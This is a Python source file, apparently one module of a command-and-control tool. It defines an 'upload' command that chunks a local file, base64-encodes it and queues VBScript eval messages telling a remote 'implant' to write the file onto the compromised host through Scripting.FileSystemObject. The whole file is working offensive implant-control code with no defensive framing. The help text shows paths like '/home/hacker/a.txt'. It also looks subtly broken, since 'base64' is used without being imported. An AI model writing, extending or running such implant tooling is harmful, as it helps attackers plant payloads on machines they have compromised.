from features import addFeature
import messages
from messages import OutgoingMessage

class UploadCommand():
  command = 'upload'

  def run(arguments, implant):
    if not implant:
      print('use implant first!')
    else:
      data = ''
      with open(arguments[0]) as f:
        lines = f.readlines()
        data = ''.join(lines)

      s = data
      chunks = []
      while s:
          chunks.append(s[:400])
          s = s[400:]

      #print('Adding message chunks to queue. Data total: '  + str(len(data)) + ' bytes in ' + str(len(chunks)) + ' chunks/messages...')

      first = True
      for chunk in chunks:
        if first:
          first = False
          s = r'CreateObject("Scripting.FileSystemObject").CreateTextFile("' + arguments[1] + '",True).Write(Base64Decode("' + base64.b64encode(chunk) + '")).Close'
        else:
          s = r'CreateObject("Scripting.FileSystemObject").OpenTextFile("' + arguments[1] + '", 8, True).Write(Base64Decode("' + base64.b64encode(chunk) + '")).Close'

        m1 = OutgoingMessage('eval', bytes(s, 'ascii'))
        implant.queueOutgoingMessage(m1)

      print('All chunks now added to outgoingmessage queue')

  def help():
      return 'upload files. NO WHITEPACES ALLOWED! OR SPECIAL CHARACTERS! ONLY CERTUTILBASE64! Usage: upload /home/hacker/a.txt h:\downloads\p.txt'

  def incoming(data, implant):
    try:
      data = str(data, 'utf-8') 
      print(data, end = '\n', flush=True)
    except:
      print('Received unencodable upload data from ' + implant.name + ': ' + data.hex())

addFeature(UploadCommand)
